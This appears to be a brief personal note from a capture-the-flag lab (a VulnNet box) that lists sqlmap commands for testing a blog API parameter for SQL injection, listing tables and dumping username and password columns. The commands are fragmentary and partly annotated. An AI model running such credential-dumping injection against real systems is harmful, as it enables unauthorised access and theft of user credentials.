Copy request as curl and use it to run sqlmap
```bash
sqlmap 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=3' ...
--tables
-D vn_admin(username) -T be_users(tablename) -C username,password --dump
```
```bash
-D blog -T users --colums
-D blog -T users --dump
```
[[awk]]
